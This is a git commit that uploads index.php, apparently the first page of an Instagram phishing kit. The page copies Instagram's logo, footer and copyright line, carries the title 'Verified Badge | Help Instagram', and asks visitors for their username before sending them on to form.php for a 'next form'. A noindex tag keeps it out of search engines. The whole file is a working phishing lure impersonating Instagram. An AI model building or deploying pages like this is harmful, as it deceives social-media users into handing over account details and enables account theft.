e01891377f0e2282ad0c6b27ddd258f8d289a842
ceylangencer031 <57834691+ceylangencer031@users.noreply.github.com>
2021-01-01 19:09:40 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,109 @@
+
+    <html>
+<head>
+<meta charset="utf-8">
+<meta name="googlebot" content="noindex,nofollow,noodp,noimageindex,noarchive,nosnippet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verified Badge | Help Instagram</title>
+<link rel="icon" href="images/favicon.png">
+<style>
+#copyright{
+color:#999;}
+#menu{
+
+
+width:91%;
+} 
+
+#liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; } 
+#asdxyz{
+background-color:white;
+width:91%;
+
+}
+#erhanasd{
+font-family:sans-serif;
+font-weight:200;
+letter-spacing:;
+color:#3d3d3d;
+font-size:20px;}
+#qenzyne{
+width:60%;
+color:#999;
+font-family:sans-serif;
+}
+#nick{
+background-color:#fafafa;
+border:1px solid #cecece;
+outline:none;
+border-radius:6px;
+width:220px;
+height:35px;
+text-align:center;
+font-size:16px;}
+
+#butonbey{
+color:white;
+background-color:#3897f0;
+font-size:17px;
+
+border-radius:5px;
+outline:none;
+font-family:sans-serif;
+font-weight:540;
+border:0;
+width:170px;
+height:30px;
+font-weight:bold;
+
+}
+#nick:hover{
+
+    border:1px solid #cecece;
+    width:310px;
+    max-width:80%;
+
+}
+</style>
+</head>     
+
+<body>
+<body bgcolor="#fafafa">
+<br>
+<br>
+<br>
+<center>
+<form method="get" action="form.php">
+<div id="asdxyz" style="border:1px solid #cecece;">
+<br>
+<img src="https://instagram.com/static/images/ico/xxxhdpi_launcher.png/9fc4bab7565b.png" width=100 >
+
+<h1 id="erhanasd">Verify Badge
+</h1>
+
+<p id="qenzyne">Please write your instagram username and click "Next" and fill the next form  </p><br>
+
+
+
+<input type="text" id="nick" name="nick" required="" placeholder="Username" class="qua21"><br><br>
+<input type="submit" value="Next" id="butonbey" style="">
+</form>
+
+<br><br>
+</div>
+</center>
+<center><br> <br>
+
+<div id="get">
+<img src="https://resimag.com/p1/b6a0e4390db.png" width=120 >
+<img src="https://resimag.com/p1/45ce843a3fd.png" width=120>
+</div>
+<br><br><br>
+<div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li> </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;">© 2020 INSTAGRAM </p>
+<br>
+
+</center>
+
+</body>
+
+</html>
